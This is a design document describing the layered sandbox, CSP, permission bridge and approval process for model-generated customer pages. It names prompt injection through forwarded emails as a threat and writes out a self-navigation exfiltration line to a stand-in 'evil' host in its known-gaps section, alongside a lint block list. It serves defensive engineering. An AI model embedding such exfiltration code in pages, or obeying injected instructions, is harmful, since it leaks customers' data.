# Security model for custom pages

Customer pages are code we didn't write and didn't review, produced by a model
from text a customer typed. They may also be produced from text an attacker got in
front of the model: a forwarded email or a pasted document can say "and also send
everything to evil.com". So treat every page as hostile. The question isn't whether
the code is good. It's what the worst page could do.

## The layers

1. **Opaque-origin sandbox.** `/frame/pages/:id` is served with
   `Content-Security-Policy: … sandbox allow-scripts allow-forms`, and the iframe also
   carries `sandbox="allow-scripts allow-forms"`. Without `allow-same-origin` the
   frame's origin is `null`: no cookies, no localStorage, no access to the
   dashboard's DOM, and requests to our API don't carry the session. The header (not
   just the attribute) means the frame URL is sandboxed even when opened directly in
   a tab. No `allow-popups` and no `allow-top-navigation`.
2. **No network.** The same CSP sets `default-src 'none'`, `connect-src 'none'`,
   images and fonts to `data:`/`blob:` only, and `form-action 'none'`. fetch, XHR,
   WebSocket, beacons, `<img src=http…>` and external scripts are all blocked by the
   browser.
3. **The bridge is the only door, and the server holds the key.** A page calls
   `desk.storage.*`, `desk.items.*` or `desk.ai.ask`. Those are postMessages to the
   dashboard, which forwards them to `POST /api/pages/:id/bridge`. `bridgeCall` in
   `server/pages.ts` decides each one against the **approved** version's
   permissions. The browser-side relay checks nothing that matters, so a tampered
   frame gains nothing by skipping it.
4. **Few, narrow capabilities.** The page's own storage (quota'd), the queue (read,
   or create/complete), and metered AI with a per-page daily cap. Nothing reaches
   email, other pages, other workspaces, or the network. Every query is scoped to the
   session's workspace.
5. **A person approves each version.** A builder output is a pending version. The
   live page keeps running the last approved version, with its permissions, until
   someone approves the new one. Preview runs the draft with storage in a separate
   `preview:<v>` namespace and turns item writes into no-ops.
6. **Lint (a tripwire, not a wall).** `lintPage` rejects URLs, network APIs,
   `location`, `parent`/`top`, `eval`, encoded strings and similar. The builder sees
   the errors and rewrites. It catches lazy prompt-injection attempts and keeps the
   code readable for review. It is easy to evade on purpose, which is why layers 1–3
   don't depend on it.

## Verified in a real browser

Checked in Chromium (2026-11-08) against a hostile page put straight into the
database, so it skipped lint and approval:

- `document.cookie`, `localStorage`, `parent.document`, `top.location`: SecurityError.
  `self.origin` is `"null"`.
- `fetch` (relative and absolute) and `new Image().src`: blocked by CSP
  (`connect-src`, `img-src`).
- `window.open`: no tab opened.
- `location.href = …` in the frame: the dashboard sees the second load, removes the
  frame, and tells the customer.

The automated tests (`server/app.test.ts`) cover the server side: permissions
follow the approved version, preview isolation, cross-workspace access, quotas,
and a builder that writes a page that tries to phone home (it's never saved).

## Known gaps

- **Self-navigation can carry data out.** A sandboxed frame can still navigate
  *itself*: `location = "https://evil/?" + data`. CSP has no working directive
  against this (`navigate-to` was dropped from the spec). The dashboard kills the
  frame afterwards, but the request has already left. What limits the damage: the page
  only ever sees its own storage and, if granted, the task list; lint rejects
  `location` and URLs in plain form; a person approved the code. Real fixes to weigh
  before launch: (a) run page logic in a Worker inside the frame, which can't
  navigate, and render from it; (b) don't give `items:read` pages anything sensitive
  in task notes; (c) a second-model review of every version, looking specifically for
  exfiltration.
- **Same origin as the app.** `/frame` is served from the app's own host. The
  sandbox makes the origin opaque, so this is safe in today's browsers, but
  production should serve frames from a separate domain (`usercontent.example`) as
  defense in depth, the way Google and GitHub do. The frame route would then need its
  own short-lived signed URL instead of the session cookie.
- **Approval fatigue.** People click Approve. The permission list is short and plain
  for that reason; keep it that way, and don't add powerful capabilities (email,
  outbound HTTP) without a stronger review step.
- **Denial of service inside the frame.** A page can spin the CPU in the customer's
  own tab. It can't affect other customers. Bridge calls are rate-limited
  (120/min per page) and storage is capped.

## Rules for adding a capability

A new `desk.*` method goes in `bridgeCall` and nowhere else. It needs a permission
name in `PERMISSIONS` with a plain-English line the customer will read. It must scope
every query to `ctx.workspaceId`. It must have a preview behavior that can't change
real data. And it needs a test in `app.test.ts` showing an unapproved page can't
use it. Outbound HTTP, if it ever comes, should be a server-side proxy with a
per-page allowlist of hosts that the customer approves, never `connect-src` in the
CSP.
